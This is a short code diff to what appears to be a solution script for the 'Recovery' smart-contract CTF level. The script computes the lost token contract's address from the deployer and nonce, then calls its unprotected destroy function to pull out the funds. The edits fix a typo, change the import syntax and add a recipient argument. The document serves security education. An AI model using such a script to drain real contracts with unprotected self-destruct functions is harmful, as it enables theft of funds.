@@ -3,7 +3,7 @@
 Recovery
  
 Vulnerability:
-Address of a contract created by a contract can be easily computed by keccak256(sender, nonse)
+Address of a contract created by a contract can be easily computed by keccak256(sender, nonce)
 and public functions with no access control can be invoked by anyone
 
 Preventative Techniques:
@@ -11,8 +11,8 @@ Always protect sensitive public functions with access control
 
 */
 
-const { ethers } = require('hardhat')
-const { getContractAddress } = require('@ethersproject/address')
+import { ethers } from 'hardhat';
+import { getContractAddress } from '@ethersproject/address';
 
 const attack = async (factoryAddress) => {
 
@@ -25,5 +25,5 @@ const attack = async (factoryAddress) => {
 
   Token.attach(tokenAddress);
 
-  await (await Token.destroy()).wait();
+  await (await Token.destroy(player)).wait();
 }
